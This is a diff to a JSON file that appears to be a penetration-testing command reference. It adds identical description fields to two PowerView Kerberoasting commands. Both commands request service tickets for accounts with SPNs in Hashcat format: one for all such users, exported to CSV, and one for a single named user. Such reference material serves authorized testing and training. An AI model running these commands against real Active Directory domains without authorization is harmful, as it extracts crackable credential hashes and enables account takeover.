@@ -179,11 +179,13 @@
   "variations": [
     {
       "label": "All SPN users at once",
-      "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv hashes.csv -NoTypeInformation"
+      "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv hashes.csv -NoTypeInformation",
+      "description": "Uses PowerView to find domain users with SPNs set - targets for Kerberoasting. PowerView provides richer output formatting and filtering than the native AD module."
     },
     {
       "label": "Single user",
-      "command": "Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat | fl"
+      "command": "Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat | fl",
+      "description": "Uses PowerView to find domain users with SPNs set - targets for Kerberoasting. PowerView provides richer output formatting and filtering than the native AD module."
     }
   ],
   "steps": [
